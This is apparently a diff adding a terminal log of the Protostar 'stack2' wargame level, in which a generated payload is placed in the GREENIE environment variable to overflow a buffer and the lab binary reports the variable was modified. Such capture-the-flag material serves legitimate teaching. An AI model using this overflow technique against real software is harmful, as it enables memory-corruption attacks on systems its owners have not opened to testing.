@@ -1,0 +1,11 @@
+user@protostar:/tmp$ python stack2.py > st2
+
+user@protostar:/tmp$ export GREENIE=$(cat st2)
+
+user@protostar:/tmp$ echo $GREENIE
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+user@protostar:/tmp$ /opt/protostar/bin/stack2
+you have correctly modified the variable
+
+user@protostar:/tmp$ 
